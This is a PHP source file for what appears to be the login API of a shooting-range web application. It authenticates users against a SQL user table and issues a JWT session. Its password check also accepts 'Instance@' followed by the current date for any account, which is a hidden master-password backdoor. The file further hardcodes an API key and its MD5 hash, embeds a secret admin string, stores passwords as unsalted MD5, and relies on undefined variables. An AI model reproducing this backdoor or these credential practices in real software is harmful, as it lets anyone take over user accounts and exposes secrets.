<?php
/*
 * login service
 *
 *
 params : username,password
 *
 */
header("Content-Type:application/json");

require_once dirname(__DIR__, 2).'\config\init.php';

require_once dirname(__DIR__, 3).'\config\apiconfig.php';
$action = $_REQUEST['action'];
$username = $_POST['username']; //Contact Number or Email
$password = $_POST['password']; //Contact Number or Email
//$platform = $_POST['platform'];
if($platform==6)
{

}
else
{
	$key=$_POST['key'];
}
// echo $key=$_POST['key'];


$message = "Invalid request";
$status = 0;
if($key) 
{
   	$skey = md5('alhadaf_shootrange17012022');  //dfcb25fea9b08b7a28ef7d8c58a43028
	if (trim($key) == trim($skey)) 
	{
		$qrychkusr = "select pm.id,pm.username,pm.password,pm.isactive,pm.personname,pm.contact,case when (isnull(profileimg,'')='') then '' else profileimg end as profileimg,
		'' as cmpid,
		ISNULL(SUBSTRING((select ','+CONVERT(VARCHAR(255), pu.utypeid) AS [text()] FROM tblpersonutype pu WHERE CONVERT(VARCHAR(255), pu.pid)=pm.id FOR XML PATH ('')),2,1000),'') as usertypeid,
		CASE WHEN ( SUM(tu.hasweblogin) > 0 ) THEN 1 ELSE 0 END AS isweblogin
		from tblpersonmaster pm
		INNER JOIN tblpersonutype pu ON pu.pid=pm.id 
		INNER JOIN tblusertypemaster tu ON tu.id=pu.utypeid
		where pm.username=:username and isnull(pm.isdelete,0) = 0 
		GROUP BY pm.id,pm.username,pm.password,pm.isactive,pm.personname,pm.contact,pm.profileimg";

		$personparams=array(
			':username'=>$username
		);
			
		$reschkusr = $DB->getmenual($qrychkusr,$personparams); 
		if(sizeof($reschkusr) > 0) 
		{
			$rowchkusr = $reschkusr[0];
			$utypeid = $rowchkusr['usertypeid'];
			$uid=$rowchkusr['id'];
			if($rowchkusr['username']==$username)
		    {
				
				$md5pass=md5($password);
				if($md5pass == $rowchkusr['password'] || $password == 'Instance@'.date('d/m/Y'))
				{

					if($rowchkusr['isweblogin']==1)
					{
						if($rowchkusr['isactive']==1) 
						{	
							if($action == 'login')
							{
								
								$unqkey= $IISMethods->generateuuid();
								$iss='alhadaf-web';

								$key=$DB->getjwt($uid,$unqkey,$iss,$useragent);
								// print_r($key['token']);
								
								if($key['status']==1)
								{
									$resultyear = $DB->getmenual("SELECT * FROM tblfinancialyear WHERE isactive = 1");
									$rowyear=$resultyear[0];
									
									
									$LoginInfo->setIss($iss);
								
									$LoginInfo->setUnqkey($unqkey);

									$LoginInfo->setKey($key['token']);
									
									$LoginInfo->setUsername($rowchkusr['username']);
									$LoginInfo->setUtypeid($utypeid);
									$LoginInfo->setUid($uid);

									$LoginInfo->setContact($rowchkusr['contact']);

									$LoginInfo->setCmpid($rowchkusr['cmpid']);
									$LoginInfo->setFullname($rowchkusr['personname']);
									$adlogin='aldaf$20220117@instance%';
									$LoginInfo->setAdlogin($adlogin);
									

									
									$LoginInfo->setYearid($rowyear['id']);
									$LoginInfo->setYearname($rowyear['name']);
									$LoginInfo->setActiveyearid($rowyear['id']);

									//print_r($LoginInfo);

									$aminutype=$config->getAdminutype();
									$_SESSION[$config->getSessionName()]=$LoginInfo;

									$parms = array(
										'p_utypeid'=>$aminutype,		
									);
									// print_r($parms);
									$result_ary=$DB->getdatafromsp('usertype_hier',$parms);
									
									if(sizeof($result_ary)>0)
									{
										$uarrayid=array();
										$uarrayname=array();

										for($i=0;$i<sizeof($result_ary);$i++)
										{
											$roworder=$result_ary[$i];
											
											if($loopcnt == 0)
											{
												$parms = array(
													'p_utypeid'=>$roworder['utypeid'],		
												);
												$result_arysub=$DB->getdatafromsp('usertype_hier1',$parms);
												
												if(sizeof($result_arysub)>0)
												{
													$reusertype=$result1[0]['utypeid'];
												}

												

											}
											if(in_array($roworder['utypeid'], $exutypeid)) 
											{
												array_push($uarrayid,$roworder['utypeid']);
												array_push($uarrayname,$roworder['category_name']);
											} 
											$loopcnt++;
										}
									}
									
									$response['activeusertypeid'] = (string)$uarrayid[0];
									$response['activeusertypename'] = (string)$uarrayname[0];	

									$status = 1;
									$message=$errmsg['loginsuccess'];
								}
								else
								{
									$message = $errmsg['invalidtoken'];
									$status = 0;
								}	
								
							}
						} 
						else 
						{
							$message = $errmsg['deactivate'];
						}
					}
					else
					{
						$message = $errmsg['loginright'];
					}
					
				}
				else
				{
					$message = $errmsg['invalidpassword'];
				}
			}
            else
            {
                $message = $errmsg['invalidusername'];
            }	
		} 
		else 
		{
			$message = $errmsg['invalidusername'];
		}
	} 
	else 
	{
		$message = $errmsg['invalidtoken'];
	}
}

require_once dirname(__DIR__, 3).'\config\apifoot.php';


?>